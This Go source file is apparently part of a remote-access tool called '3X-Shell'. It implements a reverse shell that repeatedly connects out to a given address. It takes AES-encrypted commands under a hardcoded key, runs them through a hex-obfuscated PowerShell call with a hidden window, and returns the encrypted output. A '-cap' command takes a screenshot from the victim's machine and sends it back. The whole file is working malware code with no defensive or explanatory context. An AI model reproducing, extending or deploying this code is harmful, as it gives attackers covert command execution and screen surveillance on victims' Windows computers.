package help

import (
	"3X-Shell/3x-Shell/pic"
	"bufio"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	aesgo "github.com/3xploit666/AesGo"
	"io/ioutil"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const Key = "34343243434324"

func HexTOString(plain string) string {
	content, _ := hex.DecodeString(plain)
	return string(content)
}

func Conexion3x(Network string, addr string) {
CheckerC:

	for {
		conn, err := net.Dial(Network, addr)
		if err != nil {
			time.Sleep(5 * time.Second)
		} else {
			for {

				Msg3x, Disconnect := bufio.NewReader(conn).ReadString('\n')
				if Disconnect != nil {
					goto CheckerC
				}
				if len(Msg3x) >= 1 {
					if strings.HasPrefix(aesgo.DecryptAes(Msg3x, Key), "-cap") {
						pic.GetScreenshot()
						leer, err := ioutil.ReadFile("c:\\users\\public\\cap.png")
						if err != nil {
							fmt.Println(err)
						}

						encoded := aesgo.EncryptAes(string(leer), Key)
						fmt.Fprintf(conn, base64.StdEncoding.EncodeToString([]byte(encoded))+("\n"))

					} else {
						cmd := exec.Command(HexTOString("706f7765727368656c6c"), aesgo.DecryptAes(Msg3x, Key))
						cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
						salida, err := cmd.Output()
						if err != nil {
							fmt.Fprintf(conn, aesgo.EncryptAes("Error Commands", Key))
						} else {
							for len(salida) >= 1 {
								fmt.Fprintf(conn, aesgo.EncryptAes(string(salida), Key)+"\n")
								break
							}
						}
					}
				}

			}
		}
	}

}
